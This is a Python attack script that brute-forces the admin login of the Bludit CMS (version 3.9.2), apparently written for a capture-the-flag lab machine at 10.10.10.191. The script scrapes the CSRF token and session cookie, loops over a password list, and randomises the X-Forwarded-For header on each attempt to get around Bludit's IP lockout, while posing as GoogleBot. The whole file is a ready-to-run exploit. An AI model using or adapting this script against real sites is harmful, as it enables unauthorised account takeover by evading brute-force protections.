#!/usr/bin/env python3

import os
import random
from re import search as research
from http import client
import threading


# this program was tested only in bludit v3.9.2

server = "10.10.10.191"
port = 80
path = "/admin/login"  # Path of the bludit login
check = False  # set true to check bludit version
userwordlist = "user"
passwordlist = "pass"
# user and pass can be a simple word or a path to a dictionary



wordlistpair = [userwordlist, passwordlist]
for i in range(2):
    if os.path.isfile(wordlistpair[i]):
        wordlistpair[i] = open(wordlistpair[i], 'r').read().split("\n")
    userwordlist = wordlistpair[0]
    passwordlist = wordlistpair[1]
del wordlistpair

def random_ip_generator():
    return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
                                random.randint(10,255), random.randint(10,255))

def get_cookie_N_token(HTTPHandler, head:dict, path):
    """ return cookie and token from the page """
    HTTPHandler.request("GET",path,headers=head)
    response = HTTPHandler.getresponse()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',response.read().decode()).group(1)
    cookie = research('BLUDIT-KEY=[a-zA-Z0-9]*',response.getheader('Set-Cookie')).group(0)
    return token,cookie

def POST_request(HTTPHandler, head:dict, data, path):
    """ try to loging """
    HTTPHandler.request("POST",path,body=data,headers=head)
    response = HTTPHandler.getresponse()
    info = response.read().decode()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info).group(1)
    if research("Username or password incorrect",info) == None:
        return True
    else:
        return token

def MainFunction(username,passwordlist,server,port=80,path="/admin/login"):    
    HTTPHandler = client.HTTPConnection(server,port)
    HTTPHandler.connect()
    header = {
        "Host":server,
        "User-Agent":"GoogleBot",
        "Connection":"keep-alive"
    }
    token,cookie = get_cookie_N_token(HTTPHandler,header,path)
    for password in passwordlist:
        bodydata="tokenCSRF={}&username={}&password={}&save=".format(token,username,password)    
        header = {
            "Host":server,
            "User-Agent":"GoogleBot",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8~",
            "Accept-Language":"en-US,en;q=0.5",
            "X-Forwarded-For":random_ip_generator(),
            "Referer":"http://{}{}".format(server,path),
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"{}".format(len(bodydata)),
            "DNT":"1",
            "Connection":"close",
            "Cookie":cookie,
        }
        print("[*] Trying: %20s:%-20s"%(username,password),end="\r")
        token = POST_request(HTTPHandler,header,bodydata,path)
        if token == True:
            print("\n[!] FOUND: %-20s:%20s"%(username,password))
            break
    HTTPHandler.close()

MainFunction("admin",passwordlist,server,port,path)
